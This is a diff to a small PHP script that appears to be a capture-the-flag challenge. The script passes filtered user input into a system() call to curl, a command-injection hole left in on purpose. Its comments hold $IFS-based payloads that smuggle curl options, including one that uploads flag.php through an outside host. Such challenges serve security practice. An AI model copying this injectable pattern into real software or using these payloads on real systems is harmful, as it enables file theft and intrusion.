@@ -21,7 +21,9 @@ $str = str_replace('+','',$str);
 $str = str_replace('/','',$str);
 
 
-$str = str_replace(':','',$str);  //添加这一句  
+$str = str_replace('.','',$str);
+$str = str_replace(':','',$str);  //添加这两句  
+
 return $str;
 }
 
@@ -43,13 +45,13 @@ if($num == 1 ){
 
     $cmd=strreplace($cmd);
 
-    var_dump("curl$cmd/flag.php");
+    // var_dump("curl".$cmd."flag.php");
 
-    system("curl$cmd/flag.php");
+    system("curl".$cmd."flag.php");
     }
 
 }else{echo "It Works!";}
 
-//$cmd=$IFS\-x$IFS\wonderkun.cc$IFS\-T$IFS\flag.php$IFS\http
+//$cmd=$IFS\http$IFS\-x$IFS\0x7F000001$IFS\-T$IFS\
 
 ?>
